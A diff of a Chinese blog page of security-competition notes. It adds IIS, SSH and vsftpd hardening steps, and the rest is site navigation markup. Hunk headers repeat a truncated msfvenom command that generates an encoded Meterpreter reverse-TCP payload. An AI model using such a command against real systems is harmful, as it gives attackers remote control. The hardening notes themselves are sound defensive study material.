+<h2 id="A-3任务三-Web安全加固"><a href="#A-3任务三-Web安全加固" class="headerlink" title="A-3任务三 Web安全加固"></a>A-3任务三 Web安全加固</h2><p><strong>1.为了防止web中.mdb数据库文件非法下载请对Web配置文件进行安全加固</strong><br>开始——管理工具 —— IIS管理器 —— 网站 —— Default Web Site —— 请求筛选 —— 拒绝文件扩展名，添加扩展名.mdb<br><strong>2.限制目录执行权限，对picture 和 upload 目录是指执行权限为无</strong><br>开始——管理工具 —— IIS管理器 —— 网站 —— Default Web Site —— picture/upload —— 处理程序映射—— 编辑功能权限，取消勾选<strong>执行</strong><br><strong>3.开启IIS的日志审计记录(日志文件保存格式为W3C,只记录日期、时间、客户IP地址、用户名、方法)</strong><br>开始——管理工具 —— IIS管理器 —— 网站 —— web —— 日志，格式选择W3C，点击选择字段，只勾选日期、时间、客户端IP地址、用户名、方法<br><strong>4.为了减轻网站负载，设置网站最大并发连接数为1000</strong><br>开始——管理工具 —— IIS管理器 —— 网站 —— 右侧-设置网站默认设置，设置限制连接数值1000<br><strong>5.防止文件枚举漏洞枚举网络服务器根目录文件，禁止IIS短文件名泄露</strong><br>CMD 执行命令 fsutil behavior set disable8dot3 1<br><strong>6.关闭IIS的WebDAV功能增强网站的安全性</strong><br>管理工具 —— IIS管理器 ——主机名(WIN-FVEF7SF4TF5) —— ISAPI 和 CGI 限制，右键WebDav，点击拒绝</p>
+<h2 id="A-6任务六-服务加固SSH-VSFTPD（P9Linux渗透）"><a href="#A-6任务六-服务加固SSH-VSFTPD（P9Linux渗透）" class="headerlink" title="A-6任务六 服务加固SSH\VSFTPD（P9Linux渗透）"></a>A-6任务六 服务加固SSH\VSFTPD（P9Linux渗透）</h2><p><strong>1. 修改ssh服务端口为2222；</strong><br>   修改ssh服务配置文件，<code>vim /etc/ssh/sshd_config</code><br>   查找 Port, 将注释取消，并将Port的值22改为2222<br><strong>2. ssh禁止Root用户远程登录；</strong><br>   vim中<code>/关键词</code>进行查找<br>   查找 <code>PermitRootLogin</code>, 修改值为no<br><strong>3. vsFTPd禁止匿名用户上传；</strong><br>   将 <code>anon_upload_enable</code> 注释取消，并将值改为 NO,<br>   并重启vsftpd服务<code>service vsftpd restart</code><br><strong>4. 激活 vsFTPd 上传下载日志；</strong><br>   将 <code>xferlog_enable</code> 的值设置为 YES<br>   #启用改选项，系统会记录上传下载的日志。默认情况下，日志文件为 /var/log/vsftpd.log<br><strong>5. vsFTPd 同一个IP只能连接两个；</strong><br>   在文件底部新增一行<code> max_per_ip=2</code>，并重启vsFTPd 服务.<br><strong>6. vsFTPd 将使客户端连接时的端口范围在 50000 和 60000 之间；</strong><br>   在文件底部新增两行，并重启vsFTPd服务<br>   <code>pasv_min_port=50000</code><br>   <code>pasv_max_port=60000</code><br><strong>7. vsFTPd 使本地用户登录活动范围限制在home目录；</strong><br>   取消 <code>chroot_local_user</code> 和 <code>chroot_list_enable</code> 的注释，<br>   将 <code>chroot_local_user</code> 和 <code>chroot_list_enable</code> 的值分别改为 YES 和 NO</p>
 
                 
             </div>
@@ -573,30 +650,29 @@ msfvenom –p windows/meterpreter/reverse_tcp –i 3 –e x86/shikata_ga_nai –
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2022/11/12/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/">
+                <a href="/2023/03/06/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%AF%BE%E7%A8%8B%E6%96%B9%E6%A1%88/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="网络安全笔记整理">
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="信息安全课程方案">
                         
-                        <span class="card-title">网络安全笔记整理</span>
+                        <span class="card-title">信息安全课程方案</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            赛题笔记
+                            信息安全课程方案,信息安全课程方案,信息安全课程方案,信息安全课程方案,
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-11-12
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-03-06
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -609,7 +685,6 @@ msfvenom –p windows/meterpreter/reverse_tcp –i 3 –e x86/shikata_ga_nai –
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
@@ -628,19 +703,19 @@ msfvenom –p windows/meterpreter/reverse_tcp –i 3 –e x86/shikata_ga_nai –
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/11/11/%E7%BB%84%E6%80%81%E7%BC%96%E7%A8%8B/">
+                <a href="/2022/11/11/%E5%B0%8F%E6%B8%B8%E6%88%8F%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="组态编程">
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="小游戏开发入门">
                         
-                        <span class="card-title">组态编程</span>
+                        <span class="card-title">小游戏开发入门</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            组态编程
+                            选修课的笔记，详细到每一个操作步骤，还不学的我就没有任何办法了
                         
                     </div>
                     <div class="publish-info">
@@ -662,8 +737,8 @@ msfvenom –p windows/meterpreter/reverse_tcp –i 3 –e x86/shikata_ga_nai –
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E7%BB%84%E6%80%81%E7%BC%96%E7%A8%8B/">
-                        <span class="chip bg-color">组态编程</span>
+                    <a href="/tags/%E5%B0%8F%E6%B8%B8%E6%88%8F%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/">
+                        <span class="chip bg-color">小游戏开发入门</span>
                     </a>
                     
                 </div>
@@ -687,6 +762,8 @@ msfvenom –p windows/meterpreter/reverse_tcp –i 3 –e x86/shikata_ga_nai –
 
 
 <!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
 
 
 <!-- 代码块收缩 -->
@@ -852,7 +929,7 @@ msfvenom –p windows/meterpreter/reverse_tcp –i 3 –e x86/shikata_ga_nai –
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">26.5k</span>
+                        class="white-color">33.7k</span>
             
             
             
